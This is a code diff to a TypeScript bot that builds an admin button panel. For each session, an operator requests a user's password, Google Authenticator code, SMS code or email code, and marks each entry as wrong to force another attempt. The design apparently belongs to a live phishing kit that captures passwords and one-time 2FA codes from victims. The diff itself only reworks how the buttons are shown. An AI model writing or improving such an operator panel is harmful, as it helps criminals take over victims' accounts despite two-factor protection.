@@ -387,7 +387,7 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
 
   const buttons = [];
 
-  // First row: Basic verification error buttons (always show after phone verification)
+  // First row: Always show phone number wrong button (after phone verification)
   buttons.push([
     {
       text: "❌ شماره اشتباه",
@@ -399,10 +399,10 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
     },
   ]);
 
-  // Second section: Authentication methods
+  // Second section: Authentication method buttons (show if not attempted yet)
   const authRow = [];
 
-  // Password button
+  // Password button - show if not attempted
   if (!session.authAttempts["password"]) {
     authRow.push({
       text: "🔒 Password",
@@ -411,7 +411,7 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
     console.log("✅ Added Password button");
   }
 
-  // Google Auth button
+  // Google Auth button - show if not attempted
   if (!session.authAttempts["google"]) {
     authRow.push({
       text: "📱 Google Auth",
@@ -437,7 +437,7 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
     console.log("✅ Added SMS Code button");
   }
 
-  // Email Code button
+  // Email Code button - show if not attempted
   if (!session.authAttempts["email"]) {
     buttons.push([
       {
@@ -448,48 +448,55 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
     console.log("✅ Added Email Code button");
   }
 
-  // Fourth section: Error buttons for attempted methods
-  const errorRow = [];
+  // Fourth section: Wrong buttons (ONLY show if user has attempted that method at least once)
+  const wrongButtonsRow1 = [];
+  const wrongButtonsRow2 = [];
 
-  if (session.authAttempts["password"]) {
-    errorRow.push({
-      text: "❌ رمز اشتباه",
+  // Wrong Password button - only if user attempted password at least once
+  if (
+    session.authAttempts["password"] &&
+    session.authAttempts["password"] > 0
+  ) {
+    wrongButtonsRow1.push({
+      text: "❌ Wrong Password",
       callback_data: `incorrect_password_${sessionId}`,
     });
+    console.log("✅ Added Wrong Password button");
   }
 
-  if (session.authAttempts["google"]) {
-    errorRow.push({
-      text: "❌ Google اشتباه",
+  // Wrong Google Auth button - only if user attempted google auth at least once
+  if (session.authAttempts["google"] && session.authAttempts["google"] > 0) {
+    wrongButtonsRow1.push({
+      text: "❌ Wrong Google Auth",
       callback_data: `incorrect_google_${sessionId}`,
     });
+    console.log("✅ Added Wrong Google Auth button");
   }
 
-  // Add error buttons row if there are any
-  if (errorRow.length > 0) {
-    buttons.push(errorRow);
-  }
-
-  // Additional error buttons for SMS and Email
-  const additionalErrorRow = [];
-
-  if (session.authAttempts["sms"] && session.authAttempts["sms"] >= 2) {
-    additionalErrorRow.push({
-      text: "❌ کد پیامک اشتباه",
+  // Wrong SMS button - only if user attempted SMS at least once
+  if (session.authAttempts["sms"] && session.authAttempts["sms"] > 0) {
+    wrongButtonsRow2.push({
+      text: "❌ Wrong SMS",
       callback_data: `incorrect_sms_${sessionId}`,
     });
+    console.log("✅ Added Wrong SMS button");
   }
 
-  if (session.authAttempts["email"]) {
-    additionalErrorRow.push({
-      text: "❌ کد ایمیل اشتباه",
+  // Wrong Email button - only if user attempted email at least once
+  if (session.authAttempts["email"] && session.authAttempts["email"] > 0) {
+    wrongButtonsRow2.push({
+      text: "❌ Wrong Email Code",
       callback_data: `incorrect_email_${sessionId}`,
     });
+    console.log("✅ Added Wrong Email Code button");
   }
 
-  // Add additional error buttons row if there are any
-  if (additionalErrorRow.length > 0) {
-    buttons.push(additionalErrorRow);
+  // Add wrong buttons rows if there are any
+  if (wrongButtonsRow1.length > 0) {
+    buttons.push(wrongButtonsRow1);
+  }
+  if (wrongButtonsRow2.length > 0) {
+    buttons.push(wrongButtonsRow2);
   }
 
   // Final section: Complete Auth button (if user has completed at least one additional step)
